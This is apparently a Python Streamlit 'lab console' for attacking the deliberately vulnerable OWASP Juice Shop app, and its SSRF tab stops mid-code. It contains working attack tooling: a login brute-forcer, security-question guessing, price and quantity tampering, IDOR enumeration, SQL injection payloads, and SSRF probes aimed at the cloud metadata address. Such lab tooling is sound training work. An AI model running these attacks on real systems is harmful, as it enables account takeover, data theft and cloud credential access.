#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Juice Shop Lab Console — merged (authorized testing only)

Tabs:
  1) A07 Login brute-force
  2) KBA / Security question
  3) A04 Set qty / price
  4) IDOR check
  5) SQLi Tester
  6) SQL Injection Logs
  7) A09 Logging / Monitoring
  8) A10 Server-Side Request Forgery (SSRF)   <-- NEW

Defaults assume OWASP Juice Shop at http://127.0.0.1:3000
"""

from __future__ import annotations

import json
import os
import time
import random
import string
from dataclasses import dataclass, asdict
from typing import Any, Dict, List, Optional, Tuple

import requests
import streamlit as st
import jwt  # PyJWT

# ----------------------- Shared defaults -----------------------
DEFAULT_BASE = "http://127.0.0.1:3000"
DEFAULT_LOGIN_URL = DEFAULT_BASE.rstrip("/") + "/rest/user/login"
DEFAULT_TIMEOUT = 15.0

st.set_page_config(page_title="Juice Shop Lab — Merged", page_icon="🧪", layout="wide")

# ----------------------- Common helpers ------------------------
def make_session(burp: Optional[str], verify: bool = True) -> requests.Session:
    """
    Create requests.Session with optional proxy to Burp.
    If burp is provided, route http/https through it and (lab) disable TLS verify by default.
    """
    s = requests.Session()
    s.headers.update(
        {
            "User-Agent": "JS-Lab/merged/1.0",
            "Accept": "application/json,text/plain,*/*",
            "Content-Type": "application/json",
        }
    )
    if burp:
        s.proxies = {"http": burp, "https": burp}
        s.verify = False  # lab only; interception-friendly
    else:
        s.verify = verify
    return s


def _is_localhost(url: str) -> bool:
    return "127.0.0.1" in url or "localhost" in url or "0.0.0.0" in url


def is_login_success(resp: requests.Response) -> bool:
    """Heuristic success detector."""
    if resp.status_code != 200:
        return False
    try:
        js = resp.json()
        txt = json.dumps(js).lower()
    except Exception:
        txt = resp.text.lower()
    return ("token" in txt) or ("authentication" in txt) or ("jwt" in txt)


def login_get_token(session: requests.Session, base: str, email: str, password: str, timeout: float) -> str:
    r = session.post(
        base.rstrip("/") + "/rest/user/login",
        json={"email": email, "password": password},
        timeout=timeout,
    )
    r.raise_for_status()
    js = r.json()
    token = (js.get("authentication") or {}).get("token") or js.get("token")
    if not token:
        raise RuntimeError(f"No JWT token in login response: {js}")
    session.headers.update({"Authorization": f"Bearer {token}"})
    return token


def whoami_basket_id(session: requests.Session, base: str, timeout: float) -> Optional[int]:
    r = session.get(base.rstrip("/") + "/rest/user/whoami", timeout=timeout)
    r.raise_for_status()
    info = r.json()
    bid = (
        info.get("bid")
        or (info.get("basket") or {}).get("id")
        or info.get("basketId")
        or (info.get("user") or {}).get("basketId")
    )
    try:
        return int(bid) if bid is not None else None
    except Exception:
        return None


def rest_basket(session: requests.Session, base: str, bid: int, timeout: float) -> dict:
    r = session.get(base.rstrip("/") + f"/rest/basket/{bid}", timeout=timeout)
    r.raise_for_status()
    return r.json()


def ensure_item(session: requests.Session, base: str, bid: int, pid: int, timeout: float) -> int:
    """Return BasketItem id for (bid,pid). If absent, add 1 and return new id."""
    js = rest_basket(session, base, bid, timeout)
    products = (js.get("data") or {}).get("Products") or []
    for p in products:
        if p.get("id") == pid and p.get("BasketItem", {}).get("id"):
            return p["BasketItem"]["id"]
    r = session.post(
        base.rstrip("/") + "/api/BasketItems/",
        json={"BasketId": bid, "ProductId": pid, "quantity": 1},
        timeout=timeout,
    )
    r.raise_for_status()
    js = r.json()
    return js.get("id") or (js.get("data") or {}).get("id")


def set_qty(session: requests.Session, base: str, item_id: int, qty: int, timeout: float) -> requests.Response:
    return session.put(
        base.rstrip("/") + f"/api/BasketItems/{item_id}", json={"quantity": qty}, timeout=timeout
    )


def get_total(session: requests.Session, base: str, bid: int, timeout: float) -> Optional[float]:
    try:
        js = rest_basket(session, base, bid, timeout)
        return js.get("grandTotal") or (js.get("cart") or {}).get("grandTotal")
    except Exception:
        return None


def set_price(session: requests.Session, base: str, product_id: int, price: float, timeout: float) -> Optional[int]:
    """Admin only; ignore if unauthorized."""
    r = session.put(
        base.rstrip("/") + f"/api/Products/{product_id}", json={"price": price}, timeout=timeout
    )
    if not r.ok:
        return None
    try:
        return (r.json().get("data") or {}).get("id") or r.json().get("id")
    except Exception:
        return None


# ----------------------- SQLi engine -------------------
@dataclass
class SQLiResult:
    payload: str
    status_code: Optional[int]
    ok: bool
    error: Optional[str]
    token_found: bool
    response_excerpt: str
    elapsed_ms: int
    request_body: Dict[str, Any]
    response_json: Optional[Dict[str, Any]]
    response_headers: Dict[str, Any]


def _sqli_post_once(session: requests.Session, url: str, payload: str, timeout: float):
    t0 = time.time()
    body = {"email": payload, "password": "x"}
    try:
        resp = session.post(url, data=json.dumps(body), timeout=timeout)
        excerpt = (resp.text or "")[:800]
        elapsed = int((time.time() - t0) * 1000)
        return resp, excerpt, elapsed, body
    except requests.RequestException as e:
        return None, (str(e)[:800] if str(e) else "request error"), int((time.time() - t0) * 1000), body


def run_sqli(
    url: str,
    payloads: List[str],
    burp: Optional[str],
    verify_tls: bool,
    retries: int,
    timeout: float,
) -> List[SQLiResult]:
    session = make_session(burp, verify=verify_tls)
    results: List[SQLiResult] = []

    for p in payloads:
        resp, excerpt, elapsed, body = None, "", 0, {"email": p, "password": "x"}
        last_err = None
        for _ in range(max(1, retries)):
            resp, excerpt, elapsed, body = _sqli_post_once(session, url, p, timeout)
            if resp:
                break
            last_err = excerpt
            time.sleep(0.2)

        status, ok, err, resp_json, resp_headers, token = None, False, None, None, {}, False
        if resp:
            status = resp.status_code
            ok = 200 <= status < 500
            resp_headers = dict(resp.headers or {})
            try:
                resp_json = resp.json()
            except Exception:
                resp_json = None
            try:
                token = bool(
                    isinstance(resp_json, dict)
                    and isinstance(resp_json.get("authentication"), dict)
                    and resp_json["authentication"].get("token")
                )
            except Exception:
                token = False
            if token:
                ok = True
        else:
            err = last_err

        results.append(
            SQLiResult(
                payload=p,
                status_code=status,
                ok=ok,
                error=err,
                token_found=token,
                response_excerpt=excerpt,
                elapsed_ms=elapsed,
                request_body=body,
                response_json=resp_json,
                response_headers=resp_headers,
            )
        )
        if token:
            break
    return results


# ----------------------- A09 Logging & Monitoring -------------------
def _unique_marker(prefix="A09") -> str:
    t = time.strftime("%Y%m%dT%H%M%S", time.gmtime())
    rnd = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    return f"{prefix}-{t}-{rnd}"

def _healthcheck(base: str, session: requests.Session, timeout: float):
    try:
        r = session.get(base.rstrip("/") + "/rest/products/search?q=healthcheck", timeout=timeout)
        return r.ok, r.status_code, (r.text or "")[:180]
    except requests.RequestException as e:
        return False, None, str(e)

def _failed_login_burst(base: str, session: requests.Session, email_hint: str, count: int, marker: str, timeout: float):
    rows = []
    for i in range(count):
        body = {"email": f"{marker}+{email_hint}", "password": f"wrong-{marker}-{i}"}
        try:
            r = session.post(base.rstrip("/") + "/rest/user/login", json=body, timeout=timeout)
            rows.append({"i": i + 1, "status": r.status_code, "len": len(r.content)})
        except requests.RequestException as e:
            rows.append({"i": i + 1, "status": "ERR", "err": str(e)})
        time.sleep(0.05)
    return rows

def _noauth_admin_touch(base: str, session: requests.Session, timeout: float):
    try:
        r = session.put(base.rstrip("/") + "/api/Products/1", json={"price": 0.01}, timeout=timeout)
        return {"status": r.status_code, "len": len(r.content), "excerpt": (r.text or "")[:200]}
    except requests.RequestException as e:
        return {"status": "ERR", "err": str(e)}

def _sqli_like_search(base: str, session: requests.Session, marker: str, timeout: float):
    q = f"'{marker} OR 1=1--"
    try:
        r = session.get(base.rstrip("/") + "/rest/products/search", params={"q": q}, timeout=timeout)
        return {"status": r.status_code, "len": len(r.content), "excerpt": (r.text or "")[:200], "query": q}
    except requests.RequestException as e:
        return {"status": "ERR", "err": str(e), "query": q}

def _probe_logs_public(base: str, session: requests.Session, timeout: float, marker: str):
    candidates = [
        "/support/logs",
        "/support/logs.txt",
        "/support/logs%20",
        "/ftp/log.txt",
    ]
    findings = []
    for path in candidates:
        url = base.rstrip("/") + path
        try:
            r = session.get(url, timeout=timeout)
            text = r.text if isinstance(r.text, str) else ""
            findings.append({
                "path": path,
                "status": r.status_code,
                "len": len(r.content),
                "marker_present": (marker in text) if r.ok else False,
                "snippet": text[:300] if r.ok else "",
            })
        except requests.RequestException as e:
            findings.append({"path": path, "status": "ERR", "err": str(e)})
    return findings

def run_a09_probe(base: str, burp: Optional[str], timeout: float, email_hint: str, failed_attempts: int = 8):
    s = make_session(burp, verify=True)
    marker = _unique_marker("A09")
    report = {"marker": marker, "base": base, "ts": int(time.time()), "steps": {}, "verdicts": []}

    ok, code, msg = _healthcheck(base, s, timeout)
    report["steps"]["healthcheck"] = {"ok": ok, "status": code, "msg": msg}
    if not ok:
        report["verdicts"].append("TARGET_UNREACHABLE")
        return report

    report["steps"]["failed_logins"] = _failed_login_burst(base, s, email_hint or "victim@juice-sh.op", failed_attempts, marker, timeout)
    report["steps"]["noauth_admin_touch"] = _noauth_admin_touch(base, s, timeout)
    report["steps"]["sqli_like_search"] = _sqli_like_search(base, s, marker, timeout)
    logs = _probe_logs_public(base, s, timeout, marker)
    report["steps"]["log_probes"] = logs

    public_log_paths = [f for f in logs if isinstance(f.get("status"), int) and 200 <= f["status"] < 300]
    if public_log_paths:
        report["verdicts"].append("PUBLIC_LOG_EXPOSED")

    marker_seen = any(f.get("marker_present") for f in logs if f.get("marker_present") is not None)
    if not marker_seen:
        report["verdicts"].append("INSUFFICIENT_EVENT_LOGGING")

    statuses = [row.get("status") for row in report["steps"]["failed_logins"] if "status" in row]
    if statuses and all(str(s).startswith("2") for s in statuses):
        report["verdicts"].append("SUSPICIOUS_LOGIN_RESPONSE_CODES")

    return report


# ----------------------- SSRF helpers (NEW) --------------------
def _unique_marker_ssrf(prefix="SSRF") -> str:
    t = time.strftime("%Y%m%dT%H%M%S", time.gmtime())
    rnd = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    return f"{prefix}-{t}-{rnd}"

@dataclass
class SSRFStep:
    url_to_fetch: str
    endpoint: str
    method: str
    status: Any
    length: int
    excerpt: str
    note: str

def _send_ssrf_payload(
    session: requests.Session,
    base: str,
    endpoint_path: str,
    method: str,
    template_json: str,
    target_url: str,
    timeout: float,
) -> Tuple[Any, int, str, str]:
    """
    Generic SSRF sender. Replaces {URL} in template_json, posts to base+endpoint_path with method.
    Returns (status, response_len, excerpt, note)
    """
    url = base.rstrip("/") + endpoint_path
    note = ""
    try:
        body_str = template_json.replace("{URL}", target_url)
        try:
            body = json.loads(body_str) if body_str.strip().startswith("{") else body_str
        except json.JSONDecodeError as e:
            return ("TEMPLATE_ERROR", 0, str(e)[:200], "Template is not valid JSON")
        if method.upper() == "POST":
            r = session.post(url, json=body if isinstance(body, dict) else None, data=None if isinstance(body, dict) else body, timeout=timeout)
        elif method.upper() == "PUT":
            r = session.put(url, json=body if isinstance(body, dict) else None, data=None if isinstance(body, dict) else body, timeout=timeout)
        elif method.upper() == "GET":
            params = {"url": target_url} if not isinstance(body, dict) else None
            r = session.get(url, params=params, timeout=timeout)
        else:
            return ("UNSUPPORTED_METHOD", 0, f"Method {method} not supported", "Unsupported")
        status = r.status_code
        txt = r.text or ""
        excerpt = txt[:400]
        if status in (200, 201) and (("http" in txt.lower()) or len(txt) > 200):
            note = "Possible SSRF: large/echoed response"
        return (status, len(r.content), excerpt, note)
    except requests.RequestException as e:
        return ("ERR", 0, str(e)[:200], "Network error")

def run_ssrf_probe(
    base: str,
    burp: Optional[str],
    timeout: float,
    endpoint_path: str,
    method: str,
    template_json: str,
    targets: List[str],
) -> Dict[str, Any]:
    s = make_session(burp, verify=True)
    marker = _unique_marker_ssrf()
    out: List[SSRFStep] = []

    for turl in targets:
        status, length, excerpt, note = _send_ssrf_payload(
            s, base, endpoint_path, method, template_json, turl, timeout
        )
        out.append(
            SSRFStep(
                url_to_fetch=turl,
                endpoint=endpoint_path,
                method=method,
                status=status,
                length=length,
                excerpt=excerpt,
                note=note,
            )
        )
        time.sleep(0.05)

    verdicts = []
    if any(isinstance(x.status, int) and x.status in (200, 201) and x.length > 0 for x in out):
        verdicts.append("SSRF_LIKELY")
    if any(str(x.status).startswith("ERR") for x in out):
        verdicts.append("TARGET_UNREACHABLE_OR_BLOCKED")

    return {
        "marker": marker,
        "endpoint": endpoint_path,
        "method": method,
        "verdicts": verdicts,
        "steps": [asdict(x) for x in out],
    }


# ----------------------- Sidebar (global settings) ---------------------------
with st.sidebar:
    st.markdown("### Lab Settings")
    base = st.text_input("Base URL", DEFAULT_BASE, key="base_global")
    burp = st.text_input("Burp proxy (optional)", value="", placeholder="http://127.0.0.1:8080", key="burp_global")
    timeout = st.number_input("HTTP timeout (sec)", 1.0, 60.0, DEFAULT_TIMEOUT, 0.5, key="timeout_global")

    # Pre-flight target check
    if st.button("🔎 Target Check", key="target_check_btn"):
        try:
            s = make_session(burp or None, verify=True)
            ok, code, msg = _healthcheck(base, s, float(timeout))
            if ok:
                st.success(f"Target reachable (HTTP {code})")
            else:
                st.error(f"Target check failed: {msg}")
        except Exception as e:
            st.exception(e)

    st.caption("Tip: Intercept OFF in Burp; allow localhost WebSockets.")

# Keep last SQLi run in session so the Logs tab can render
if "last_rows" not in st.session_state:
    st.session_state["last_rows"] = None
if "last_meta" not in st.session_state:
    st.session_state["last_meta"] = None

# ----------------------- Tabs layout --------------------------
tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs(
    [
        "A07 Login brute-force",
        "KBA / Security question",
        "A04 Set qty / price",
        "IDOR check",
        "SQLi Tester",
        "SQL Injection Logs",
        "A09 Logging / Monitoring",
        "A10 Server-Side Request Forgery (SSRF)",
    ]
)

# ----------------------- Tab 1: A07 brute-force ----------------
with tab1:
    st.subheader("A07 Identification & Authentication Failures — Login brute-force")
    email = st.text_input("Target email", key="a07_email")
    wordlist = st.text_area(
        "Passwords (one per line)", height=150, placeholder="123456\npassword\nadmin123", key="a07_wordlist"
    )
    delay = st.number_input(
        "Delay between attempts (sec)", 0.0, 3.0, 0.0, 0.1, key="a07_delay"
    )
    run = st.button("Start brute-force", type="primary", key="a07_go")

    if run:
        if not (base and email and wordlist.strip()):
            st.error("Base, email and wordlist are required.")
        else:
            s = make_session(burp)
            rows, hit = [], None
            pwds = [p.strip() for p in wordlist.splitlines() if p.strip()]
            prog = st.progress(0.0)
            out = st.empty()
            for i, pw in enumerate(pwds, 1):
                try:
                    r = s.post(
                        base.rstrip("/") + "/rest/user/login",
                        json={"email": email, "password": pw},
                        timeout=timeout,
                    )
                    ok = is_login_success(r)
                    line = f"{pw:20} -> {r.status_code} ({len(r.content)} bytes)"
                    if ok:
                        line += "   <-- HIT"
                        hit = (pw, r)
                    out.text(line)
                    rows.append(
                        {
                            "#": i,
                            "password": pw,
                            "status": r.status_code,
                            "length": len(r.content),
                            "note": "HIT" if ok else "",
                        }
                    )
                    prog.progress(i / max(len(pwds), 1))
                    if ok:
                        break
                except requests.RequestException as e:
                    rows.append(
                        {
                            "#": i,
                            "password": pw,
                            "status": "ERROR",
                            "length": 0,
                            "note": str(e),
                        }
                    )
                if delay:
                    time.sleep(delay)
            st.write("Results", rows)
            csv = (
                "#,password,status,length,note\n"
                + "\n".join(
                    f'{r["#"]},{r["password"]},{r["status"]},{r["length"]},{r["note"]}'
                    for r in rows
                )
            )
            st.download_button(
                "Download CSV",
                data=csv.encode(),
                file_name="results_login.csv",
                mime="text/csv",
            )
            if hit:
                pw, resp = hit
                st.success(f"SUCCESS for {email} : {pw}")
                try:
                    token = (
                        (resp.json().get("authentication") or {}).get("token")
                        or resp.json().get("token")
                        or ""
                    )
                    if token:
                        st.code("JWT (truncated): " + token[:80] + " ...")
                except Exception:
                    pass

# ----------------------- Tab 2: KBA / Security question --------
with tab2:
    st.subheader("KBA / Security-question probe")
    colA, colB = st.columns(2)
    with colA:
        endpoint = st.text_input("Endpoint path (from Burp)", "/rest/user/reset-password", key="kba_endpoint")
        method = st.selectbox("Method", ["POST", "PUT"], key="kba_method")
        email_kba = st.text_input("Email placeholder {EMAIL}", "test@example.com", key="kba_email")
        success_text = st.text_input(
            "Success keywords (comma-separated)", "reset,new password,token,success", key="kba_needles"
        )
    with colB:
        template = st.text_area(
            "JSON template (use {ANSWER} and optional {EMAIL})",
            height=150,
            value='{"email":"{EMAIL}","answer":"{ANSWER}"}',
            key="kba_template",
        )
        answers = st.text_area(
            "Answers (one per line)", height=150, value="blue\nred\ngreen\n1990\n1991", key="kba_answers"
        )
    go_kba = st.button("Run KBA probe", type="primary", key="kba_go")

    if go_kba:
        try:
            s = make_session(burp)
            url = base.rstrip("/") + endpoint
            needles = [x.strip().lower() for x in success_text.split(",") if x.strip()]
            hit = None
            lines = [a.strip() for a in answers.splitlines() if a.strip()]
            for ans in lines:
                body_str = template.replace("{EMAIL}", email_kba).replace("{ANSWER}", ans)
                try:
                    body = json.loads(body_str)
                except json.JSONDecodeError as e:
                    st.error(f"TEMPLATE ERROR for answer '{ans}': {e}")
                    break
                r = s.post(url, json=body, timeout=timeout) if method == "POST" else s.put(url, json=body, timeout=timeout)
                txt = r.text.lower()
                ok = (r.status_code == 200) or any(n in txt for n in needles)
                st.write(
                    f"{ans:20} -> {r.status_code} ({len(r.content)} bytes)"
                    + ("   <-- HIT" if ok else "")
                )
                if ok:
                    hit = ans
                    st.success(f"SUCCESS with answer: {ans}")
                    st.code(r.text[:300].replace("\n", " "))
                    break
                time.sleep(0.05)
            if not hit:
                st.warning("No success with provided answers.")
        except requests.RequestException as e:
            st.error(f"Request error: {e}")

# ----------------------- Tab 3: A04 Set qty / price -------------
with tab3:
    st.subheader("A04 Insecure Design — Set quantity / price")
    col1, col2 = st.columns(2)
    with col1:
        email_id = st.text_input("User email (must exist)", key="a04_email")
        pwd_id = st.text_input("Password", type="password", key="a04_pw")
        basket_opt = st.text_input("BasketId (optional if unknown)", "", key="a04_bid")
        products_raw = st.text_input("Product IDs (space or comma separated)", "1 6 24", key="a04_pids")
    with col2:
        qtys_raw = st.text_input("Quantities (broadcast single or match count)", "-1 2 5", key="a04_qtys")
        prices_raw = st.text_input(
            "Prices (optional; admin only)", "", placeholder="0.49 1.99 (or leave blank)", key="a04_prices"
        )
        go_qty = st.button("Apply", type="primary", key="a04_go")

    if go_qty:
        try:
            s = make_session(burp)
            token = login_get_token(s, base, email_id, pwd_id, timeout)
            bid = int(basket_opt) if basket_opt.strip() else whoami_basket_id(s, base, timeout)
            if not bid:
                st.error(
                    "No basket id. Add any item once in the UI, or provide BasketId manually."
                )
            else:
                def to_ints(s0: str) -> List[int]:
                    return [int(x) for x in s0.replace(",", " ").split() if x.strip()]
                def to_floats(s0: str) -> List[float]:
                    return [float(x) for x in s0.replace(",", " ").split() if x.strip()]

                prods = to_ints(products_raw)
                qtys = to_ints(qtys_raw)
                if len(qtys) == 1:
                    qtys = [qtys[0]] * len(prods)
                if len(qtys) != len(prods):
                    st.error("Quantity count must be 1 or equal to Product count.")
                else:
                    prices = to_floats(prices_raw) if prices_raw.strip() else None
                    if prices and len(prices) == 1:
                        prices = [prices[0]] * len(prods)
                    if prices and len(prices) != len(prods):
                        st.error("Price count must be 1 or equal to Product count.")
                    else:
                        before = get_total(s, base, bid, timeout)
                        rows, flags = [], set()
                        for i, pid in enumerate(prods):
                            iid = ensure_item(s, base, bid, pid, timeout)
                            if prices:
                                set_price(s, base, pid, prices[i], timeout)  # may be unauthorized
                            r = set_qty(s, base, iid, qtys[i], timeout)
                            after = get_total(s, base, bid, timeout)
                            note = []
                            if qtys[i] <= 0 and r.status_code in (200, 201, 204):
                                note.append("ACCEPTED_NONPOSITIVE_QTY")
                                flags.add("ACCEPTED_NONPOSITIVE_QTY")
                            if isinstance(after, (int, float)) and isinstance(before, (int, float)):
                                if after < 0:
                                    note.append("NEGATIVE_TOTAL")
                                    flags.add("NEGATIVE_TOTAL")
                            rows.append(
                                {
                                    "basket": bid,
                                    "product": pid,
                                    "itemId": iid,
                                    "qty": qtys[i],
                                    "status": r.status_code,
                                    "grandTotal": after,
                                    "note": ";".join(note),
                                }
                            )
                            before = after
                            time.sleep(0.1)
                        st.write("Results", rows)
                        if flags:
                            st.warning(
                                "Potential insecure design indicators: " + ", ".join(sorted(flags))
                            )
                        else:
                            st.success("Server rejected invalid quantities as expected.")
        except requests.RequestException as e:
            st.error(f"Request error: {e}")
        except Exception as e:
            st.error(str(e))

# ----------------------- Tab 4: IDOR check ---------------------
with tab4:
    st.subheader("IDOR check — enumerate accessible baskets")
    email_i = st.text_input("Email", key="idor_email")
    pwd_i = st.text_input("Password", type="password", key="idor_pw")
    max_id = st.number_input("Max BasketId to check", 1, 1000, 50, 1, key="idor_max")
    go_idor = st.button("Check IDOR", type="primary", key="idor_go")

    if go_idor:
        try:
            s = make_session(burp)
            token = login_get_token(s, base, email_i, pwd_i, timeout)
            # decode own uid (no signature validation; lab only)
            try:
                decoded = jwt.decode(token, options={"verify_signature": False, "verify_aud": False})
            except Exception:
                decoded = {}
            my_uid = (decoded.get("data") or {}).get("id")

            found = []
            for i in range(1, int(max_id) + 1):
                r = s.get(base.rstrip("/") + f"/rest/basket/{i}", timeout=timeout)
                if r.status_code == 200:
                    try:
                        data = r.json().get("data") or {}
                        uid = data.get("UserId")
                        if my_uid and uid != my_uid:
                            found.append({"basket_id": i, "userId": uid})
                    except Exception:
                        pass
                time.sleep(0.02)
            if found:
                st.error("Potential IDORs found:")
                st.write(found)
            else:
                st.success("No IDOR found within that range.")
        except requests.RequestException as e:
            st.error(f"Request error: {e}")

# ----------------------- Tab 5: SQLi Tester --------------------
with tab5:
    st.subheader("SQLi Tester (login endpoint payloads)")
    sqli_url = st.text_input("Login API URL", DEFAULT_LOGIN_URL, key="sqli_url")
    use_burp = st.checkbox(
        "Route via Burp (127.0.0.1:8080)",
        value=bool(burp),
        key="use_burp_sqli"
    )
    verify_tls = st.checkbox("Verify TLS certificates", value=True, key="sqli_verify")
    retries = st.number_input("Retries", 0, 5, 1, key="sqli_retries")

    APP_DIR = os.path.dirname(os.path.abspath(__file__))
    PAYLOADS_PATH = os.path.join(APP_DIR, "payloads.txt")
    if "payload_text" not in st.session_state:
        st.session_state["payload_text"] = "' OR 1=1--\nadmin'--"

    c1, c2, c3 = st.columns([1, 1, 2])
    with c1:
        if st.button("📥 Load payloads.txt", key="sqli_load"):
            if os.path.exists(PAYLOADS_PATH):
                try:
                    st.session_state["payload_text"] = open(PAYLOADS_PATH, "r", encoding="utf-8").read()
                    st.success(f"Loaded from {PAYLOADS_PATH}")
                except Exception as e:
                    st.error(f"Read error: {e}")
            else:
                st.error(f"Not found: {PAYLOADS_PATH}")
    with c2:
        if st.button("💾 Save payloads.txt", key="sqli_save"):
            try:
                open(PAYLOADS_PATH, "w", encoding="utf-8").write(st.session_state["payload_text"])
                st.success(f"Saved to {PAYLOADS_PATH}")
            except Exception as e:
                st.error(f"Write error: {e}")
    with c3:
        payload_file = st.file_uploader("Upload payloads.txt", type=["txt"], key="sqli_uploader")

    st.text_area("Payloads (one per line)", key="payload_text", height=160)
    go_sqli = st.button("▶️ Run SQLi Test", type="primary", key="sqli_go")

    if go_sqli:
        if not _is_localhost(sqli_url):
            st.error("For safety, the GUI SQLi tester only allows localhost targets.")
        else:
            if payload_file is not None:
                payloads = [
                    ln.decode("utf-8").strip()
                    for ln in payload_file.read().splitlines()
                    if ln.strip() and not ln.strip().startswith("#")
                ]
            else:
                text_src = st.session_state.get("payload_text", "")
                payloads = [ln.strip() for ln in text_src.splitlines() if ln.strip() and not ln.strip().startswith("#")]

            with st.spinner("Running..."):
                results = run_sqli(
                    url=sqli_url,
                    payloads=payloads,
                    burp=burp if use_burp else None,
                    verify_tls=verify_tls,
                    retries=int(retries),
                    timeout=float(timeout),
                )

            rows = []
            logs = []
            for r in results:
                rows.append(
                    {
                        "payload": r.payload,
                        "status_code": r.status_code,
                        "ok": r.ok,
                        "token_found": r.token_found,
                        "elapsed_ms": r.elapsed_ms,
                        "error": r.error or "",
                        "response_excerpt": r.response_excerpt,
                    }
                )
                logs.append(
                    {
                        "payload": r.payload,
                        "request_body": r.request_body,
                        "status_code": r.status_code,
                        "response_headers": r.response_headers,
                        "response_json": r.response_json,
                        "response_excerpt": r.response_excerpt,
                        "token_found": r.token_found,
                        "elapsed_ms": r.elapsed_ms,
                        "error": r.error,
                    }
                )

            st.session_state["last_rows"] = rows
            st.session_state["last_meta"] = {
                "url": sqli_url,
                "use_burp": use_burp,
                "verify_tls": verify_tls,
                "retries": int(retries),
                "ts": int(time.time()),
                "logs": logs,
            }

    if st.session_state["last_rows"]:
        st.subheader("Results")
        st.dataframe(st.session_state["last_rows"], use_container_width=True, hide_index=True)
        st.download_button(
            "💾 Download JSON",
            data=json.dumps(
                {"url": st.session_state["last_meta"]["url"], "results": st.session_state["last_rows"]},
                indent=2,
            ),
            file_name="results.json",
            mime="application/json",
        )

# ----------------------- Tab 6: SQL Injection Logs --------------
with tab6:
    st.subheader("SQL Injection — Request/Response Logs")
    meta = st.session_state.get("last_meta")
    if not meta:
        st.info("Run a test from the **SQLi Tester** tab to populate logs here.")
    else:
        st.caption(
            f"Target: {meta['url']}  |  Burp: {'on' if meta['use_burp'] else 'off'}  |  TLS verify: {meta['verify_tls']}  |  Retries: {meta['retries']}"
        )
        logs = meta.get("logs") or []
        if not logs:
            st.warning("No logs recorded for the last run.")
        else:
            for idx, entry in enumerate(logs, 1):
                with st.expander(
                    f"{idx}. Payload: {entry['payload']}  |  status={entry['status_code']}  |  token_found={entry['token_found']}  |  {entry['elapsed_ms']} ms",
                    expanded=False,
                ):
                    st.markdown("**Request Body**")
                    st.code(json.dumps(entry["request_body"], indent=2), language="json")

                    st.markdown("**Response Status & Headers**")
                    st.code(
                        json.dumps({"status_code": entry["status_code"], "headers": entry["response_headers"]}, indent=2),
                        language="json",
                    )

                    st.markdown("**Response JSON (parsed if possible)**")
                    if entry["response_json"] is not None:
                        st.code(json.dumps(entry["response_json"], indent=2), language="json")
                    else:
                        st.info("No valid JSON detected; showing excerpt instead.")
                        st.code(entry["response_excerpt"] or "", language="text")

# ----------------------- Tab 7: A09 Logging / Monitoring --------
with tab7:
    st.subheader("A09 Security Logging & Monitoring — Demonstration")
    st.caption(
        "Generates a unique marker, fires noisy actions (failed logins, suspicious search, unauthorized admin touch), "
        "then probes for public logs and checks whether our marker appears — demonstrating insufficient observability."
    )

    colA, colB, colC = st.columns([1.2, 1, 1])
    base_a09 = colA.text_input("Base URL", value=base, key="a09_base")
    email_hint = colA.text_input("Email hint for failed-logins", value="victim@juice-sh.op", key="a09_emailhint")

    attempts = colB.number_input("Failed login attempts", min_value=3, max_value=50, value=8, step=1, key="a09_attempts")
    timeout_a09 = colB.number_input("Timeout (sec)", min_value=2.0, max_value=60.0, value=timeout, step=0.5, key="a09_timeout")

    use_burp_a09 = colC.checkbox(
        "Route via Burp (127.0.0.1:8080)",
        value=bool(burp),
        key="use_burp_a09"
    )
    burp_url = burp if (use_burp_a09 and burp) else ("http://127.0.0.1:8080" if use_burp_a09 else None)

    run_a09 = st.button("▶️ Run A09 Probe", type="primary", use_container_width=True, key="a09_go")

    if run_a09:
        with st.spinner("Running A09 logging/monitoring probe..."):
            report = run_a09_probe(base_a09, burp_url, float(timeout_a09), email_hint, int(attempts))

        st.success("A09 probe complete.")
        st.markdown("**Summary**")
        st.json({"marker": report["marker"], "verdicts": report.get("verdicts", [])})

        st.markdown("**Healthcheck**")
        st.json(report["steps"].get("healthcheck", {}))

        st.markdown("**Failed Login Burst**")
        st.json(report["steps"].get("failed_logins", []))

        st.markdown("**Unauthorized Admin Touch**")
        st.json(report["steps"].get("noauth_admin_touch", {}))

        st.markdown("**Suspicious Search**")
        st.json(report["steps"].get("sqli_like_search", {}))

        st.markdown("**Log Exposure Probes**")
        for entry in report["steps"].get("log_probes", []):
            with st.expander(f"{entry.get('path')}  —  status: {entry.get('status')}"):
                st.json(entry)

        st.download_button(
            "💾 Download A09 Report (JSON)",
            data=json.dumps(report, indent=2),
            file_name=f"a09_report_{report['marker']}.json",
            mime="application/json",
            use_container_width=True,
        )

# ----------------------- Tab 8: A10 SSRF (NEW) -----------------
with tab8:
    st.subheader("A10 Server-Side Request Forgery (SSRF) — Demonstration")
    st.caption(
        "Sends a crafted URL to a backend endpoint that fetches remote resources. "
        "Used to show how a server can be abused to reach internal services or sensitive metadata."
    )

    colL, colM, colR = st.columns([1.4, 1, 1])
    with colL:
        base_ssrf = st.text_input("Base URL", value=base, key="ssrf_base")
        endpoint_path = st.text_input(
            "Candidate vulnerable endpoint path",
            value="/profile/image-url",
            help="Full path after base (e.g., /profile/image-url or /rest/xx/yy)",
            key="ssrf_endpoint",
        )
        method = st.selectbox("HTTP method", ["POST", "PUT", "GET"], index=0, key="ssrf_method")
    with colM:
        template_json = st.text_area(
            "Request template (use {URL})",
            height=120,
            value='{"imageUrl":"{URL}"}',
            help="Will replace {URL} and send as JSON (POST/PUT). For GET, the tool will pass ?url={URL} if JSON is not applicable.",
            key="ssrf_template",
        )
        use_burp_ssrf = st.checkbox(
            "Route via Burp (127.0.0.1:8080)",
            value=bool(burp),
            key="use_burp_ssrf"
        )
    with colR:
        targets_default = "\n".join(
            [
                "http://127.0.0.1:3000/ftp/log.txt",
                "http://localhost:3000/ftp/log.txt",
                "http://169.254.169.254/latest/meta-data/",
            ]
        )
        targets_raw = st.text_area(
            "URLs to fetch (one per line)",
            height=120,
            value=targets_default,
            help="Add internal IPs, services, or metadata endpoints you want the server to try to fetch.",
            key="ssrf_targets",
        )
        timeout_ssrf = st.number_input("Timeout (sec)", 2.0, 60.0, float(timeout), 0.5, key="ssrf_timeout")

    run_ssrf = st.button("▶️ Run SSRF Probe", type="primary", use_container_width=True, key="ssrf_go")

    if run_ssrf:
        targets = [t.strip() for t in targets_raw.splitlines() if t.strip()]
